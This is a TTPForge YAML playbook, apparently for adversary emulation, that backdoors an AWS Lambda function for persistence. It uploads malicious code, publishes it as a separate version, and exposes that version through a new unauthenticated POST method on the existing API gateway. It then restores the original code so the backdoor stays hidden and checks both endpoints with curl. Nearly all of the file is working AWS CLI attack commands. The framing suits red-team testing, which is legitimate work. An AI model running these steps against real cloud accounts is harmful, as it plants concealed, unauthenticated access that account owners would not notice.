---
api_version: 2.0
uuid: ead96c5b-0f83-4976-be5a-e7ff5ff5cdea
name: backdoor-lambda-version-and-API
description: |
  This TTP is used to backdoor an existing lambda function. To execute this TTP one needs to have a
  lambda function accessible via a public API gateway.
  TTP creates a version of backdoored code and then redeploys the original code to the latest lambda version
  The backdoor version of the code can then be invoked using a seperate method API request.


args:
  - name: lambda_function_name
    description: The name of the new Lambda function to be created.
    default: ttpforge-lambda-function

mitre:
  tactics:
    - TA0003 Persistence
  techniques:
    - T1543 Create or Modify System Process

steps:
  - name: create_temp_lambda_function
    description: This step creates a new lambda function which will then be backdoored by this TTP
    ttp: //cloud/aws/lambda/create-lambda-function/create-lambda-function.yaml

  - name: backup_current_lmbda_function_code
    description: This step creates a backup copy of the existing lambda function code.
    inline: |
      backup_code_url=$(aws lambda get-function --function-name {{.Args.lambda_function_name}} --query 'Code.Location' --output text)
      curl -o backup.zip $backup_code_url

    cleanup:
      inline: |
        rm -rf backup.zip

  - name: upload_backdoor_code
    description: In this step we upload the malicious backup code in the lambda function we want to backdoor
    inline: |
      zip -r backdoor-code.zip lambda-function.py
      aws lambda update-function-code --function-name {{.Args.lambda_function_name}} --zip-file fileb://backdoor-code.zip > /dev/null 2>&1
      sleep 10

    cleanup:
      inline: |
        rm -rf backdoor-code.zip

  - name: create_POSTAPI_to_backdoored_code
    description: |
      This is the key step of this TTP. Here we create a seperate method in existing API gateway.
      This API method is invoked using the FunctionArn of the backdoored code.
    inline: |
      # Publish the Backdoor code and get its function ARN.
      backdoor_function_arn=$(aws lambda publish-version --function-name {{.Args.lambda_function_name}} | jq -r '.FunctionArn') #Get function ARN output of this one. Will be useful later when deploying the POST API



      # Get the rest_api_id and root_resource_id
      rest_api_id=$(aws apigateway get-rest-apis --query 'items[?name==`{{.Args.lambda_function_name}}-api`].id' --output text)
      root_resource_id=$(aws apigateway get-resources --rest-api-id $rest_api_id --query 'items[?path==`/`].id' --output text)


      # Create a POST method in existing resource
      aws apigateway put-method --rest-api-id $rest_api_id --resource-id $root_resource_id --http-method POST --authorization-type "NONE" > /dev/null 2>&1


      # Add necessary permissions to the new resource method
      account_id=$(aws sts get-caller-identity --query Account --output text)
      account_region=$(aws configure get region)
      statement_id=apigateway-$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)-{{.Args.lambda_function_name}}
      source_arn="arn:aws:execute-api:$account_region:$account_id:$rest_api_id/*/POST/"

      aws lambda add-permission --function-name $backdoor_function_arn --source-arn $source_arn \
      --principal apigateway.amazonaws.com --statement-id $statement_id --action lambda:InvokeFunction > /dev/null 2>&1


      # Connect the POST method to the Lambda function (define integration)
      lambda_func_arn=$(aws lambda get-function --function-name {{.Args.lambda_function_name}} --query 'Configuration.FunctionArn' --output text)
      lambda_invocation_uri="arn:aws:apigateway:$account_region:lambda:path/2015-03-31/functions/$backdoor_function_arn/invocations"   #Here we usinge the ARN of published version

      aws apigateway put-integration --rest-api-id $rest_api_id \
      --resource-id $root_resource_id --http-method POST --type AWS \
      --integration-http-method POST --uri $lambda_invocation_uri > /dev/null 2>&1


      # Specify a METHOD response for HTTP status code 200
      aws apigateway put-method-response --rest-api-id $rest_api_id --resource-id $root_resource_id --http-method POST --status-code 200 > /dev/null 2>&1

      # Specify an INTEGRATION RESPONSE for a method response code of 200 and allow Passthrough content handling
      aws apigateway put-integration-response --rest-api-id $rest_api_id --resource-id $root_resource_id \
      --http-method POST --status-code 200 --response-templates '{"application/json":"$input.path('\'$.body\'')"}' > /dev/null 2>&1

      # # Deploy the API
      aws apigateway create-deployment --rest-api-id $rest_api_id --stage-name prod > /dev/null 2>&1


    cleanup:
      inline: |
        echo "No cleanup required since this resources are nuked during parent TTP cleanup"


  - name: redeploy_original_code
    description: Redeploy the original lambda function code so that the original function service is not lost.
    inline: |
      aws lambda update-function-code --function-name {{.Args.lambda_function_name}} --zip-file fileb://backup.zip > /dev/null 2>&1
      sleep 10
      aws lambda publish-version --function-name {{.Args.lambda_function_name}} | jq -r '.FunctionArn' > /dev/null 2>&1

  - name: verify_backdoor_function
    description: Here we verify that both orignial function code and backdoored function codes can be invoked via different methods
    inline: |
      account_region=$(aws configure get region)
      rest_api_id=$(aws apigateway get-rest-apis --query 'items[?name==`{{.Args.lambda_function_name}}-api`].id' --output text)
      invoke_url="https://$rest_api_id.execute-api.$account_region.amazonaws.com/prod"
      echo $invoke_url

      echo -e "Invoke API for original code\n\n"
      curl $invoke_url

      # We need for some time before we can invoke lambda function via POST API, if not it throws an authentication error
      sleep 20
      echo -e "Invoke API for Backdoored code\n\n"
      curl -X POST $invoke_url
